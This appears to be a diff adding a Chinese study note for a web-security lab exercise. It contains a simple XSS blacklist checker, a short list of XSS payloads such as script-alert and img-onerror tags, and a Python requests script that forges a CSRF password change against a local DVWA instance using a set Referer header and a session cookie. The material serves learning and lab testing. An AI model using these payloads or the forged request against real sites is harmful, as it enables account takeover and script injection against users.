@@ -1,0 +1,55 @@
+## 一、核心目标
+1.  掌握XSS危险字符检测的基础逻辑
+2.  学会批量遍历XSS Payload，理解自动化测试思路
+3.  使用requests库模拟CSRF无Token攻击，理解防护缺失的风险
+
+---
+
+## 二、代码实现与逐行解析
+
+### 第1题：字符串基础·XSS风险字符检测
+```python
+# 检查输入是否包含XSS危险字符
+def check_xss(input_str):
+    # 定义XSS高危字符与关键字黑名单
+    danger = ['<script>', 'alert', '<', '>', '"', "'"]
+    # 遍历黑名单，检测输入中是否包含危险内容
+    for d in danger:
+        if d in input_str:
+            return True
+    return False
+
+# 测试恶意输入
+test = "<script>alert(1)</script>"
+print("输入:", test)
+print("存在XSS风险:", check_xss(test))
+
+### 第2题：列表循环·批量Payload遍历
+# 批量遍历XSS Payload，基础测试逻辑
+payloads = [
+    "<script>alert(1)</script>",
+    "< img src=x onerror=alert(1)>",
+    "normal text"
+]
+
+# 带序号遍历所有Payload，打印内容与长度
+for i, p in enumerate(payloads):
+    print(f"Payload{i+1}: {p} | 长度:{len(p)}")
+
+### 第3题：requests实战·CSRF无Token模拟   （手工完成+验证实际更改情况）
+import requests
+url="http://127.0.0.1:9999/dvwa/vulnerabilities/csrf/"
+params={
+    "password_new":"password",
+    "password_conf":"password",
+    "Change":"Change"
+}
+headers={
+    "Referer":"http://127.0.0.1:9999/dvwa/security.php"}
+cookies={
+    "PHPSESSID":"0g8bcr8f8jhiiddpp6g0g6ghc1",
+    "security":"medium"
+}
+resp=requests.get(url,params=params,cookies=cookies,headers=headers)
+print("状态码:",resp.status_code)
+print("响应长度:",len(resp.text))
